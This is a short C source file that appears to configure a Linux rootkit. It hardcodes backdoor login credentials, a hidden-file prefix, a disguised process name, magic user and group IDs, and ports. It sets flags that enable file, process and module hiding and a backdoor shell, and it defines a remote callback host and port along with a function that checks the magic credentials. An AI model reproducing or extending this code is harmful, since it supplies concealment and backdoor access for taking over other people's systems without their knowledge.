#include "defs.h"
#include <string.h>
#include <stdlib.h>

const char *MAGIC_USERNAME = "wh1t3adm";
const char *MAGIC_PASSWORD = "g0ldpass";
const char *MAGIC_FILE_PREFIX = ".ice_";
const char *MAGIC_PROC_NAME = "icecored";
const char *MAGIC_PORT = "4444";

gid_t magic_gid = 8888;
uid_t magic_uid = 8888;

int enable_file_hiding = 1;
int enable_process_hiding = 1;
int enable_module_hiding = 1;
int enable_backdoor_shell = 1;

const char *remote_host = "127.0.0.1";
const int remote_port = 1337;

int validate_credentials(const char *user, const char *pass) {
    return (strcmp(user, MAGIC_USERNAME) == 0 && strcmp(pass, MAGIC_PASSWORD) == 0);
}
